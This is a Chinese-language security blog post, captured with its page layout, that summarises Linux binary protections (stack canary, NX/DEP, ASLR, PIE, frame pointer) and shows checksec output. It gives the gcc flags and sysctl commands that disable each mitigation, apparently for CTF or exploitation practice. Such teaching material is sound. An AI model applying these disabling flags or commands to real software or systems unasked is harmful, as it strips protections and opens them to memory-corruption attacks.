+<h2 id="CANARY">CANARY</h2>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/24465014/gcc-generate-canary-or-not">stack overflow - gcc generate canary or not</a></p>
+<table>
+<thead>
+<tr>
+<th>Canary</th>
+<th>gcc 編譯參數</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Enable</td>
+<td>DEFAULT (when buffer large enough)</td>
+</tr>
+<tr>
+<td>Disable</td>
+<td><code>gcc -fno-stack-protector code.c</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="NX-No-Execute-DEP-Data-Execution-Prevention">NX (No-Execute) / DEP (Data Execution Prevention)</h2>
+<p>可以寫的地方不能執行</p>
+<table>
+<thead>
+<tr>
+<th>NX / DEP</th>
+<th>gcc 編譯參數</th>
+<th>execstack</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Enable</td>
+<td>DEFAULT</td>
+<td><code>execstack -s code</code></td>
+</tr>
+<tr>
+<td>Disable</td>
+<td><code>gcc -z execstack code.c</code></td>
+<td><code>execstack -c code</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="ASLR-Address-Space-Layout-Randomization">ASLR (Address Space Layout Randomization)</h2>
+<p><a target="_blank" rel="noopener" href="https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/">Configuring ASLR with randomize_va_space</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示關閉進程地址空間隨機化。</span><br><span class="line">1 - 表示 mmap, stack, vdso 隨機化。</span><br><span class="line">2 - 表示比 1 多了 heap 隨機化。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>
+<h2 id="PIE-Position-Independent-Executables">PIE (Position Independent Executables)</h2>
+<table>
+<thead>
+<tr>
+<th>PIE</th>
+<th>gcc 編譯參數</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Enable</td>
+<td><code>gcc -fpie -pie code.c</code></td>
+</tr>
+<tr>
+<td>Disable</td>
+<td>DEFAULT</td>
+</tr>
+</tbody>
+</table>
+<h2 id="FRAME-POINTER">FRAME POINTER</h2>
+<p>有開的話是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>沒開的話是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add rsp, 0x18</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th>Canary</th>
+<th>gcc 編譯參數</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Enable</td>
+<td>DEFAULT</td>
+</tr>
+<tr>
+<td>Disable</td>
+<td><code>gcc -fomit-frame-pointer code.c</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="checksec"><a target="_blank" rel="noopener" href="https://github.com/slimm609/checksec.sh">checksec</a></h2>
+<p><a target="_blank" rel="noopener" href="https://github.com/slimm609/checksec.sh">checksec</a> 是一個用來查看上述所說的保護機制的 bash script</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE</span><br><span class="line">Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   65 Symbols     No       0               1       ./hello</span><br></pre></td></tr></table></figure>
+<p>pwntools 也有內建一個名字和功能都一樣的指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2019/03/21/protection/#more">Read more</a></div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/images/avatar.png" alt="oalieno"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">oalieno</p><p class="is-size-6 is-block">資安研究員</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Taiwan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">30</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">40</p></a></div></div></nav><div class="level"><a class="level-item button is-primary" href="https://github.com/oalieno" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/oalieno"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com/oalieno"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Linkedin" href="https://www.linkedin.com/in/oalieno/"><i class="fab fa-linkedin"></i></a></div></div></div><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/"><span class="level-start"><span class="level-item">區塊鍊</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%94%E7%AE%97%E6%B3%95/"><span class="level-start"><span class="level-item">演算法</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%A8%8B%E5%BC%8F/"><span class="level-start"><span class="level-item">程式</span></span><span class="level-end"><span class="level-item tag">12</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/"><span class="level-start"><span class="level-item">資安</span></span><span class="level-end"><span class="level-item tag">13</span></span></a><ul><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/pwn/"><span class="level-start"><span class="level-item">pwn</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/reverse/"><span class="level-start"><span class="level-item">reverse</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E8%B3%87%E5%AE%89/writeups/"><span class="level-start"><span class="level-item">writeups</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li></ul></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2022-03-29T16:00:00.000Z">2022-03-30</time></p><p class="title"><a href="/2022/03/30/blog03/">【部落格開發日誌】0x03</a></p><p class="categories"><a href="/categories/%E7%A8%8B%E5%BC%8F/">程式</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-26T16:00:00.000Z">2021-02-27</time></p><p class="title"><a href="/2021/02/27/flow/">【項目介紹】Flow ( Dapper Labs )</a></p><p class="categories"><a href="/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/">區塊鍊</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-08-15T16:00:00.000Z">2020-08-16</time></p><p class="title"><a href="/2020/08/16/clipboard-hijack/">Clipboard hijacking cryptocurrency malware on tradingview.com</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-07-30T16:00:00.000Z">2020-07-31</time></p><p class="title"><a href="/2020/07/31/maltego/">【工具介紹】Maltego</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/2020/06/09/ais3-2020-preexam/"><p align="center"><img data-src="/images/ais3-scores.png" class=" lazyload" alt="【CTF Writeups】AIS3 pre-exam 2020"></p></a></figure><div class="media-content"><p class="date"><time dateTime="2020-06-08T16:00:00.000Z">2020-06-09</time></p><p class="title"><a href="/2020/06/09/ais3-2020-preexam/">【CTF Writeups】AIS3 pre-exam 2020</a></p><p class="categories"><a href="/categories/%E8%B3%87%E5%AE%89/">資安</a> / <a href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">February 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">August 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">July 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/06/"><span class="level-start"><span class="level-item">June 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">May 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">March 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">February 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">January 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/09/"><span class="level-start"><span class="level-item">September 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/06/"><span class="level-start"><span class="level-item">June 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/05/"><span class="level-start"><span class="level-item">May 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/04/"><span class="level-start"><span class="level-item">April 2019</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/03/"><span class="level-start"><span class="level-item">March 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/01/"><span class="level-start"><span class="level-item">January 2019</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/09/"><span class="level-start"><span class="level-item">September 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/08/"><span class="level-start"><span class="level-item">August 2018</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/02/"><span class="level-start"><span class="level-item">February 2018</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/GIL/"><span class="tag">GIL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/adb/"><span class="tag">adb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/algorithm/"><span class="tag">algorithm</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/android/"><span class="tag">android</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blockchain/"><span class="tag">blockchain</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/blog/"><span class="tag">blog</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/burp/"><span class="tag">burp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/c/"><span class="tag">c++</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/command/"><span class="tag">command</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/crypto/"><span class="tag">crypto</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ctf/"><span class="tag">ctf</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/dapper-labs/"><span class="tag">dapper labs</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/drony/"><span class="tag">drony</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flow/"><span class="tag">flow</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/frida/"><span class="tag">frida</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/gdb/"><span class="tag">gdb</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hexo/"><span class="tag">hexo</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/icarus/"><span class="tag">icarus</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/kernel/"><span class="tag">kernel</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nord/"><span class="tag">nord</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/nox/"><span class="tag">nox</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/osint/"><span class="tag">osint</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powerlevel10k/"><span class="tag">powerlevel10k</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/powerlevel9k/"><span class="tag">powerlevel9k</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/proxy/"><span class="tag">proxy</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwn/"><span class="tag">pwn</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pyc/"><span class="tag">pyc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse/"><span class="tag">reverse</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/reverse-ssh/"><span class="tag">reverse ssh</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rootkit/"><span class="tag">rootkit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/rsa/"><span class="tag">rsa</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/security/"><span class="tag">security</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/seo/"><span class="tag">seo</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/srop/"><span class="tag">srop</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssh/"><span class="tag">ssh</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tunnel/"><span class="tag">tunnel</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/writeups/"><span class="tag">writeups</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/zimfw/"><span class="tag">zimfw</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/zsh/"><span class="tag">zsh</span><span class="tag">1</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">歐欸利恩的部落格</a><p class="is-size-7"><span>&copy; 2022 oalieno</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">Visited by <span id="busuanzi_value_site_uv">0</span> users</span></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/oalieno"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "This website uses cookies to improve your experience.",
+          dismiss: "Got it!",
+          allow: "Allow cookies",
+          deny: "Decline",
+          link: "Learn more",
+          policy: "Cookie Policy",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/mhchem.min.js" defer></script><script>window.addEventListener("load", function() {
+            document.querySelectorAll('[role="article"] > .content').forEach(function(element) {
+                renderMathInElement(element);
+            });
+        });</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
+            'HTML-CSS': {
+                matchFontHeight: false
+            },
+            SVG: {
+                matchFontHeight: false
+            },
+            CommonHTML: {
+                matchFontHeight: false
+            },
+            tex2jax: {
+                inlineMath: [
+                    ['$','$'],
+                    ['\\(','\\)']
+                ]
+            }
+        });</script><script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" integrity="sha512-q583ppKrCRc7N5O0n2nzUiJ+suUv7Et1JGels4bXOaMFQcamPk9HjdUknZuuFjBNs7tsMuadge5k9RzdmO+1GQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
+        });</script></body></html>
